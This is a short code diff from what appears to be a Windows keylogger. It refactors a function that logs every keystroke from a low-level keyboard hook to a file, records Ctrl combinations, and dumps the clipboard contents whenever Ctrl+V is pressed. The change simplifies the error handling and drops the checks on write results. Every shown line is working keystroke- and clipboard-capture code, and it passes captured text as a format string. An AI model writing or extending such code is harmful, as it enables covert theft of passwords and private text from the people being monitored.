@@ -14,14 +14,14 @@ errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 	errno_t rc = fopen_s(&out_file, OUT_FILE, "a");
 
 	if (rc)
-		goto out;
+		return rc;
 
 	LPCWSTR vk_val = get_key_value(kbd_hook->vkCode);
 
 	if (vk_val != NULL) {
-		rc = fwprintf_s(out_file, vk_val);
+		fwprintf_s(out_file, vk_val);
 	} else if (is_key_down(VK_CONTROL)) {
-		rc = fprintf_s(out_file, "[CTRL + %c]", (CHAR)kbd_hook->vkCode);
+		fprintf_s(out_file, "[CTRL + %c]", (CHAR)kbd_hook->vkCode);
 
 		if (kbd_hook->vkCode == VK_V)
 			write_clipboard_data(out_file);
@@ -29,13 +29,10 @@ errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 		WCHAR key_buff[KEY_BUFFER_SIZE];
 
 		if (kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE) > 0)
-			rc = fwprintf_s(out_file, key_buff);
+			fwprintf_s(out_file, key_buff);
 	}
 
-close:
-	fclose(out_file);
-out:
-	return rc;
+	return fclose(out_file);
 }
 
 BOOL is_ignored(DWORD vk_code) 
